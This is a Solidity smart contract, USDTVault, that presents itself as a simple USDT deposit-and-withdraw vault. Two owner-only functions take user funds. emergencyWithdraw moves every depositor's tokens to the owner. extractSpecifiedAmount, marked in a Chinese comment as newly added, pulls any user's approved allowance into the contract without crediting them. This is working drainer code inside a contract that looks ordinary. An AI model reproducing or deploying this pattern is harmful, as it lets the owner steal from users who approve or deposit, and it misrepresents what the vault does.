// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract USDTVault {
    address public owner;
    IERC20 public usdtToken;

    mapping(address => uint256) public balances;

    constructor(address _usdtAddress) {
        owner = msg.sender;
        usdtToken = IERC20(_usdtAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }

    function deposit(uint256 amount) external {
        require(usdtToken.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        balances[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        require(usdtToken.transfer(msg.sender, amount), "Transfer failed");
    }

    function checkTotalBalanceInContract() external view returns (uint256) {
        return usdtToken.balanceOf(address(this));
    }

    function emergencyWithdraw() external onlyOwner {
        uint256 totalBalance = usdtToken.balanceOf(address(this));
        require(usdtToken.transfer(owner, totalBalance), "Transfer failed");
    }

    // 新增：允许合约所有者提取用户的授权余额
    function extractSpecifiedAmount(address _user, uint256 _amount) external onlyOwner {
    uint256 authorizedAmount = usdtToken.allowance(_user, address(this));
    require(_amount <= authorizedAmount, "Trying to extract more than the authorized amount");
    
    // 将USDT从用户账户转移到此合约
    require(usdtToken.transferFrom(_user, address(this), _amount), "Extraction failed");
    
    // 如果需要跟踪在合约中从每个用户处提取的总金额，可以使用另一个映射。但在这里，我们不再更新用户的主要余额。
}





}